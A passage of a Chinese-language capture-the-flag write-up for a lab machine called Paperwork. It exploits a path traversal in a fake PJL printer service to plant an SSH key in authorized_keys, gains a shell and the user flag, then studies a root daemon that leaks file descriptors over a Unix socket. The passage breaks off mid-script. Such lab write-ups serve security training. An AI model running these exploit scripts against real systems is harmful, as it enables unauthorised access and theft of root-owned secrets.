+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="s2">&#34;FSDIRLIST&#34;</span> in line.upper<span class="o">()</span> or <span class="s2">&#34;FSQUERY&#34;</span> in line.upper<span class="o">()</span>:
+</span></span><span class="line"><span class="cl">                <span class="nv">m</span> <span class="o">=</span> re.search<span class="o">(</span>r<span class="s1">&#39;NAME\s*=\s*&#34;([^&#34;]+)&#34;&#39;</span>, line, re.I<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">res</span> <span class="o">=</span> fs.listdir<span class="o">(</span>m.group<span class="o">(</span>1<span class="o">)</span> <span class="k">if</span> m <span class="k">else</span> <span class="s2">&#34;0:/&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">                client.reply<span class="o">(</span>res + <span class="s2">&#34;\r\n&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="s2">&#34;INFO ID&#34;</span> in line.upper<span class="o">()</span>:
+</span></span><span class="line"><span class="cl">                client.reply<span class="o">(</span><span class="s2">&#34;HP LASERJET 4ML\r\n&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="s2">&#34;INFO FILESYS&#34;</span> in line.upper<span class="o">()</span>:
+</span></span><span class="line"><span class="cl">                client.reply<span class="o">(</span><span class="s2">&#34;VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS\n0:     1755136    1718272    &lt;HT&gt;     &lt;HT&gt;  READ-WRITE\r\n&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="s2">&#34;ECHO&#34;</span> in line.upper<span class="o">()</span>:
+</span></span><span class="line"><span class="cl">                client.reply<span class="o">(</span>line + <span class="s2">&#34;\r\n&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span>:
+</span></span><span class="line"><span class="cl">                client.reply<span class="o">(</span><span class="s2">&#34;OK\r\n&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        client.close<span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>存在漏洞的代码段：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_translate</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clean</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;0:&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">normpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_root</span><span class="p">,</span> <span class="n">clean</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先将路径中的 <code>0:</code> 清除，然后替换 <code>\</code> 为 <code>/</code>，最后 <code>lstrip</code> 删除字符串开头所有连续的 <code>/</code>。</p>
+<p>而这里并没有 ban 掉 <code>..</code>，所以我们可以实现目录穿越。</p>
+<p>而根据代码中的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">LOG_FILE</span> <span class="o">=</span> <span class="s2">&#34;/home/archivist/printer/logs/commands.log&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们可以知道项目所在目录是 <code>/home/archivist/printer/</code>。</p>
+<p>把我们自己的公钥写入 <code>/home/archivist/.ssh/authorized_keys</code>，就可以 SSH 登录 <code>archivist</code> 用户。</p>
+<p>输入 path 为 <code>0:/../.ssh/authorized_keys</code></p>
+<p>这样输入之后会被处理为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">replace<span class="o">(</span><span class="s2">&#34;0:&#34;</span>, <span class="s2">&#34;&#34;</span><span class="o">)</span>       -&gt; /../.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">lstrip<span class="o">(</span><span class="s2">&#34;/&#34;</span><span class="o">)</span>             -&gt; ../.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">join<span class="o">(</span>self._root, clean<span class="o">)</span> -&gt; /home/archivist/printer/../.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">final                   -&gt; /home/archivist/.ssh/authorized_keys
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先在攻击机生成我们的公钥然后复制。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen -t rsa -b <span class="m">4096</span> -f ~/.ssh/pwn_key -N <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">cat ~/.ssh/pwn_key.pub 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在靶机写脚本并执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;&lt;</span><span class="s1">&#39;EOF&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pub</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;ssh-rsa .... root@kali&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;0:/../.ssh/authorized_keys&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">job</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;@PJL FSDOWNLOAD NAME=&#34;&#39;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;&#34; SIZE=&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pub</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="mi">9100</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">job</span> <span class="o">+</span> <span class="n">pub</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">EOF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">lp</span><span class="nd">@paperwork</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">LPDServer</span><span class="err">$</span> <span class="n">python3</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span> 
+</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;OK</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样我们的公钥就成功写入了，通过私钥 SSH 连接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Paperwork<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# chmod <span class="m">600</span> ~/.ssh/pwn_key
+</span></span><span class="line"><span class="cl">                                                            
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Paperwork<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh -i ~/.ssh/pwn_key archivist@10.129.248.117
+</span></span><span class="line"><span class="cl">archivist@paperwork:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>archivist<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>archivist<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>archivist<span class="o">)</span>
+</span></span><span class="line"><span class="cl">archivist@paperwork:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">ceab4d4b37f34cc6fb790fa3cca24d2b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 user flag：<code>ceab4d4b37f34cc6fb790fa3cca24d2b</code></p>
+<h2 id="提权">提权
+</h2><p>列出以 root 用户启动的进程。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ps aux <span class="p">|</span> awk <span class="s1">&#39;$1=&#34;root&#34;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从中找到一条</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root <span class="m">1489</span> 0.0 0.4 <span class="m">28432</span> <span class="m">17976</span> ? Ss 11:21 0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看其源代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">array</span><span class="o">,</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">shutil</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">admin_fd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;/etc/paperwork/admin_pins.conf&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">O_RDONLY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">LOG_PATH</span> <span class="o">=</span> <span class="s2">&#34;/home/archivist/printer/logs/commands.log&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_admin_secret</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">pread</span><span class="p">(</span><span class="n">admin_fd</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;ADMIN_PASSWORD=&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;ADMIN_PASSWORD=&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scan_for_malice</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">LOG_PATH</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">LOG_PATH</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">trigger</span> <span class="ow">in</span> <span class="n">content</span> <span class="k">for</span> <span class="n">trigger</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;FSQUERY&#34;</span><span class="p">,</span> <span class="s2">&#34;FSUPLOAD&#34;</span><span class="p">,</span> <span class="s2">&#34;FSDOWNLOAD&#34;</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">trigger_lockdown</span><span class="p">(</span><span class="n">conn</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log_fd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">LOG_PATH</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">O_RDONLY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">evidence_bundle</span> <span class="o">=</span> <span class="n">array</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="s2">&#34;i&#34;</span><span class="p">,</span> <span class="p">[</span><span class="n">log_fd</span><span class="p">,</span> <span class="n">admin_fd</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">msg</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">sendmsg</span><span class="p">([</span><span class="n">msg</span><span class="p">],</span> <span class="p">[(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SCM_RIGHTS</span><span class="p">,</span> <span class="n">evidence_bundle</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">zip_path</span> <span class="o">=</span> <span class="s2">&#34;/root/quarantine/evidence.zip&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_path</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">zipf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">LOG_PATH</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="s2">&#34;commands.log&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">LOG_PATH</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">truncate</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="n">log_fd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">socket_path</span> <span class="o">=</span> <span class="s2">&#34;/run/paperwork/mgmt.sock&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">socket_path</span><span class="p">):</span> <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">socket_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;/run/paperwork&#34;</span><span class="p">):</span> <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="s2">&#34;/run/paperwork&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">(</span><span class="n">socket_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="n">socket_path</span><span class="p">,</span> <span class="mo">0o660</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">chown</span><span class="p">(</span><span class="n">socket_path</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">scan_for_malice</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="n">trigger_lockdown</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">secret</span> <span class="o">=</span> <span class="n">get_admin_secret</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">token</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SYSTEM_CLEAN:</span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STATUS: SYSTEM_CLEAN</span><span class="se">\n</span><span class="s2">SIGNATURE: </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可见这个进程打开了 <code>admin_pins.conf</code> 文件，其中存有 <code>ADMIN_PASSWORD=</code>。</p>
+<p>同时它还监听了一个 Unix socket。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">socket_path</span> <span class="o">=</span> <span class="s2">&#34;/run/paperwork/mgmt.sock&#34;</span>
+</span></span><span class="line"><span class="cl">s.bind<span class="o">(</span>socket_path<span class="o">)</span>
+</span></span><span class="line"><span class="cl">os.chmod<span class="o">(</span>socket_path, 0o660<span class="o">)</span>
+</span></span><span class="line"><span class="cl">os.chown<span class="o">(</span>socket_path, 0, 1000<span class="o">)</span> <span class="c1"># 修改文件所属组为1000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由 <code>/etc/group</code> 可知 <code>1000</code> 是 <code>archivist</code> 组。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">archivist@paperwork:~$ cat /etc/group
+</span></span><span class="line"><span class="cl">root:x:0:
+</span></span><span class="line"><span class="cl">archivist:x:1000:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样我们 <code>archivist</code> 就有权限去访问该 socket。</p>
+<p>当守护进程在日志文件中检测到可疑命令时，它会进入取证模式，并将打开的文件描述符发送给连接的客户端：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">evidence_bundle</span> <span class="o">=</span> array.array<span class="o">(</span><span class="s2">&#34;i&#34;</span>, <span class="o">[</span>log_fd, admin_fd<span class="o">])</span>
+</span></span><span class="line"><span class="cl"><span class="nv">msg</span> <span class="o">=</span> b<span class="s2">&#34;ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.&#34;</span>
+</span></span><span class="line"><span class="cl">conn.sendmsg<span class="o">([</span>msg<span class="o">]</span>, <span class="o">[(</span>socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle<span class="o">)])</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>守护进程以 root 用户身份打开文件 → 我们以归档管理员身份接收到文件描述符 → 我们就可以读取 root 用户拥有的文件。</p>
+<p>通过写入恶意日志条目触发取证模式，这里写入的是 <code>FSQUERY</code> 命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import socket
